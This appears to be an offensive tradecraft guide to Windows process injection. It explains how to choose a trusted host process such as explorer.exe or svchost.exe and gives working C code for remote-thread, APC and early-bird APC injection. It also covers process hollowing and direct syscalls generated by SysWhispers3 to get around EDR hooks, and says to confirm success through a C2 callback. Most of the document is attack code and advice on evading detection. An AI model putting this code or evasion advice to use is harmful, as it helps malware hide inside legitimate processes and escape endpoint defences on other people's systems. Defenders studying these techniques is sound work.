# Process injection

Executing shellcode or a DLL within the address space of a legitimate running process.
The payload runs under the cover of a trusted process, inheriting its network
connections, token, and visual identity in process lists.

## Choose a target process

The target process determines context and risk:

- `explorer.exe`: always running, user context, good network access, long-lived
- `svchost.exe`: many instances, system or service context, high trust, monitored
- `dllhost.exe` / `RuntimeBroker.exe`: less scrutinised than svchost, user context
- Browser processes: legitimate reasons to make network connections, but heavily
  monitored by EDR
- A process related to the operation's cover story (e.g. inject into the software
  update process on a system where updates are expected)

Avoid injecting into security products, antivirus processes, or other high-value
targets that will trigger immediate investigation.

```powershell
# find a suitable target
Get-Process explorer, svchost, dllhost, RuntimeBroker |
  Select-Object Id, Name, Path, WorkingSet |
  Format-Table -AutoSize
```

## Classic remote thread injection

The most documented technique, and therefore the most detected. Use it when the target
EDR does not monitor `OpenProcess` + `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread`.

```c
#include <windows.h>

bool inject_classic(DWORD target_pid, unsigned char *shellcode, size_t shellcode_len) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, target_pid);
    if (!hProcess) return false;

    LPVOID remote_mem = VirtualAllocEx(
        hProcess, NULL, shellcode_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) { CloseHandle(hProcess); return false; }

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remote_mem, shellcode, shellcode_len, &written)) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_mem,
        NULL, 0, NULL);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
```

## APC injection

Queue an Asynchronous Procedure Call (APC) to an alertable thread in the target
process. The APC executes when the thread enters an alertable wait state.

```c
// find an alertable thread in the target process (threads calling SleepEx,
// WaitForSingleObjectEx, etc. with bAlertable=TRUE)
// svchost.exe typically has alertable threads

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, shellcode_len,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, remote_mem, shellcode, shellcode_len, NULL);

// enumerate threads of target process
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te = { sizeof(THREADENTRY32) };
Thread32First(hSnapshot, &te);
do {
    if (te.th32OwnerProcessID == target_pid) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                     FALSE, te.th32ThreadID);
        QueueUserAPC((PAPCFUNC)remote_mem, hThread, 0);
        CloseHandle(hThread);
    }
} while (Thread32Next(hSnapshot, &te));
CloseHandle(hSnapshot);
CloseHandle(hProcess);
```

Early-bird APC: inject into a newly created (suspended) process before it starts
executing, queue the APC, then resume. The APC fires before any of the process's own
code runs.

```c
PROCESS_INFORMATION pi;
STARTUPINFOA si = {sizeof(si)};
// create target in suspended state
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL,
               FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote_mem, shellcode, shellcode_len, NULL);
QueueUserAPC((PAPCFUNC)remote_mem, pi.hThread, 0);
ResumeThread(pi.hThread);
```

## Process hollowing

Create a legitimate process in a suspended state, replace its memory with the payload,
then resume. The process appears legitimate in every process list but executes the
payload.

```c
// 1. create target process suspended
// 2. unmap the target's original image (NtUnmapViewOfSection)
// 3. allocate memory at the original base address
// 4. write the payload PE, fixing up headers and sections
// 5. update the PEB ImageBaseAddress and thread context (EIP/RIP to payload entry point)
// 6. resume thread

// implementation references: see github.com/m0n0ph1/Process-Hollowing
// note: CreateRemoteThread + hollowing is detected by most current EDR;
// combine with direct syscalls to avoid userland hooks
```

## Direct syscall injection

Bypass EDR userland hooks by using direct syscalls instead of the hooked ntdll
functions. The allocation, write, and thread creation steps are performed via direct
syscall stubs:

```c
// generated by SysWhispers3 for the target Windows version:
// NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx

// these are called directly without going through hooked ntdll
// EDR hooks in ntdll are bypassed entirely
NtAllocateVirtualMemory(target_handle, &remote_mem, 0, &region_size,
                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
NtWriteVirtualMemory(target_handle, remote_mem, shellcode, shellcode_len, NULL);
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, target_handle,
                  remote_mem, NULL, FALSE, 0, 0, 0, NULL);
```

## Verify injection

```powershell
# after injection: confirm shellcode is running
# look for the expected callback (C2 connection, named pipe, etc.)
# check that the target process is still alive and functioning normally
Get-Process -Id $targetPid | Select-Object Id, Name, Responding
```

The target process should continue functioning normally. A crash of the target process
immediately after injection indicates a problem with the shellcode or memory layout.
